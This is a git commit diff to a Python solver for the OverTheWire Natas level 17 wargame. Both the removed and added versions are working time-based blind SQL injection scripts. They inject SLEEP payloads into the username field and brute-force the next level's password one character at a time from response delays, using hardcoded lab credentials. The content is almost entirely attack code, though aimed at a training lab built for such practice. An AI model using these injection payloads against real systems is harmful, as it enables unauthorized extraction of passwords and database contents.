6be800272492dbcfd0b8eb8ae1dbf7ab1afdaccf
HwangJimmy <112998284+HwangJimmy@users.noreply.github.com>
2022-10-09 13:31:06 +0800

    Update natas17.py

--- natas/natas17.py
+++ natas/natas17.py
@@ -1,53 +1,39 @@
-#!/usr/bin/env python3
-
 import requests
-from requests.auth import HTTPBasicAuth
 
+pwd_len = 32
 
-sleep_time = 1
-s = requests.Session()
-s.auth = HTTPBasicAuth("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")
-url = 'http://natas17.natas.labs.overthewire.org/?debug'
+charset_0 = (
+	'0123456789' +
+	'abcdefghijklmnopqrstuvwxyz' +
+	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+)
+charset_1 = '468agknoquvwxDEFGJLNPQUVZ'
 
+target = 'http://natas17.natas.labs.overthewire.org'
+auth=('natas17','XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')
+sleep_time = 15
 
-def get_password_chars():
-    filtered_chars = ''
-    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+'''
+for c in charset_0:
+	username = 'natas18" AND IF(password LIKE BINARY "%%%c%%",SLEEP(%d), 1)#' % (c, sleep_time)
+	r = requests.get(target, auth=auth, params={"username": username}
+	)
+	s = r.elapsed.total_seconds()
+	if s >= sleep_time:
+		charset_1 += c
+		print ('C: ' + charset_1.ljust(len(charset_0), '*'))
+'''
+#print ""
 
-    print('Looking for password char set...')
-    for char in chars:
-        data = {'username': f'natas18" and password like binary "%{char}%" and sleep({sleep_time}) #'}
-        resp = s.post(url, data=data)
-        # print(f'response time: {resp.elapsed.seconds}')
-
-        if resp.elapsed.seconds >= sleep_time:
-            filtered_chars += char
-            print(f'The password contains: {filtered_chars}')
-
-    return filtered_chars
-
-
-def get_password(filtered_chars):
-    password = ''
-    for i in range(32):
-        print(f'Looking for position {i}...')
-
-        for char in filtered_chars:
-            data = {'username': f'natas18" and password rlike binary "^{password}{char}" and sleep({sleep_time}) #'}
-            resp = s.post(url, data=data)
-
-            # print(f'response time: {resp.elapsed.seconds}')
-            if resp.elapsed.seconds >= sleep_time:
-                password += char
-                print(password)
-                break
-
-    return password
-
-
-# Step 1: Find out what chars the password contains
-filtered_chars = get_password_chars()
-
-# Step 2: Find out the password by ordering the chars found in step 1
-password = get_password(filtered_chars)
-print(f'The password: {password}')
+password = "8NE"
+while len(password) != pwd_len:
+	for c in charset_1:
+		t = password + c
+		username = 'natas18" AND IF(password LIKE BINARY "%s%%",SLEEP(%d), 1)#' % (t, sleep_time)
+		r = requests.get(target, auth=auth, params={"username": username}
+		)
+		s = r.elapsed.total_seconds()
+		if s >= sleep_time:
+			print ('P: ' + t.ljust(pwd_len, '*'))
+			password = t
+			break
